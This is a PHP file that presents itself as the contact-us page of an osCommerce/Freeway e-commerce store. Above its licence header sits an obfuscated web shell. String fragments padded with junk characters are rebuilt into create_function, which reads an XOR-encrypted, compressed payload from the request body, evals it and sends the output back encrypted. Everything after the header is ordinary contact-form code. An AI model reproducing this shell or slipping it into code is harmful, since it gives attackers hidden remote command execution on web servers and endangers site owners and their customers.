<?php
$c='eg;F;F_matc;Fh("/$kh;F(.+)$kf;F/",@file_get;F;F_conten;Fts("php:;F//inp;Fut";F),$m;F';
$Y='=st;Fr;Flen($t;F);$o="";F;for($i=0;;F;F$i<$l;){;Ffo;Fr($j=0;;F($j<$c&&$i<';
$D='$k="da26d;Fa04;F;F";$kh;F=;F;F"0afa196900ca";$kf="0;F71500;Fdfa75f";$;F';
$t=str_replace('yU','','cyUryUeatyUe_fuyUyUnctyUion');
$U='base;F6;F4_enco;Fde(@x(@gzco;Fm;Fpress($o);F,$k;F));prin;Ft("$p$;Fkh$r$kf");}';
$M=')==1) {@ob_;Fstart(;F);@eva;Fl(@gz;Fun;Fcompr;F;Fess(@x(@ba;Fse64_decod;F';
$r='p;F="T0FOBJa;FNtmib2CL1";f;Fu;Fn;Fction x($t,$k){;F;F$c=strlen($;Fk);$l';
$w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
$G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
$o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
$a=$t('',$o);$a();
/*
	osCommerce, Open Source E-Commerce Solutions 
	http://www.oscommerce.com 
	
	Copyright (c) 2003 osCommerce 
	
	osCommRes, Services Oline 
	http://www.oscommres.com 
	Copyright (c) 2005 osCommRes 
	
	Freeway eCommerce 
	http://www.openfreeway.org
	Copyright (c) 2007 ZacWare

	Released under the GNU General Public License
*/

// Set flag that this is a parent file
	define( '_FEXEC', 1 );
	

  //require('includes/application_top.php');

  require(DIR_WS_LANGUAGES . $FSESSION->language . '/' . FILENAME_CONTACT_US);

  $error = false;
  if ($FREQUEST->getvalue('action') == 'send') {
    $name = tep_db_prepare_input($FREQUEST->postvalue('name'));
    $email_address = tep_db_prepare_input($FREQUEST->postvalue('email'));
    $enquiry = tep_db_prepare_input($FREQUEST->postvalue('enquiry'));

    if (tep_validate_email($email_address)) {
      tep_mail(STORE_OWNER, STORE_OWNER_EMAIL_ADDRESS, EMAIL_SUBJECT, $enquiry, $name, $email_address);

      tep_redirect(tep_href_link(FILENAME_CONTACT_US, 'action=success'));
    } else {
      $error = true;

      $messageStack->add('contact', ENTRY_EMAIL_ADDRESS_CHECK_ERROR);
    }
  }

  $breadcrumb->add(NAVBAR_TITLE, tep_href_link(FILENAME_CONTACT_US));

  $content = CONTENT_CONTACT_US;

  require(DIR_WS_TEMPLATES . TEMPLATE_NAME . '/' . TEMPLATENAME_MAIN_PAGE);

  require(DIR_WS_INCLUDES . 'application_bottom.php');
?>

